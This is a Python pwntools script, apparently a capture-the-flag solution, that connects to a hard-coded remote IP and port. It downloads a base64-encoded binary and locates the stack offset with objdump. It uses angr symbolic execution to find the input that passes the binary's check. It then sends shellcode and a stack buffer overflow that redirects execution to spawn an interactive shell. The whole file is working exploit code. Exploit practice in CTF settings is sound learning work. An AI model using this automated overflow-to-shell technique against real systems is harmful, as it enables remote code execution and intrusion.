#!/usr/bin/python -u
from pwn import *
import base64
import subprocess
import angr
context.arch = "amd64"
ip = "133.130.124.59"
port = 9993
s = remote(ip, port)
print(s.recvuntil("base64"))
program = s.recvuntil("NOW")
program = program[:program.find("NOW")]
elf = base64.b64decode(program)
with open('tmp','wb') as f:
    f.write(elf)
output = subprocess.check_output("objdump -d -M intel tmp | grep 'push   rbp' -A 4  | grep 'mov    edi,0x1' -B 4 | grep 'sub'",shell=True).strip()
print(output)
offset = int(output[output.find('rsp,')+4:],16) -8 
print(offset)
output = subprocess.check_output("objdump -d -M intel tmp | grep 'mov    edx,0x64'",shell=True).strip()
print(output)
destination = int(output[:output.find(':')], 16)
print(destination)
p = angr.Project("./tmp", load_options={'auto_load_libs': False})
ex = p.surveyors.Explorer(find=destination, enable_veritesting=True)
ex.run()
payload = ''
if ex.found:
    payload = ex.found[0].state.posix.dumps(0)
print(payload)
s.recvuntil('Guess what sushi looks like now!')
s.send(payload)
s.recvuntil('Now')
s.sendline(asm(shellcraft.sh())+"a"*75)
s.sendline("a"*offset+"b"*8+p64(0x6012c0))
s.interactive()
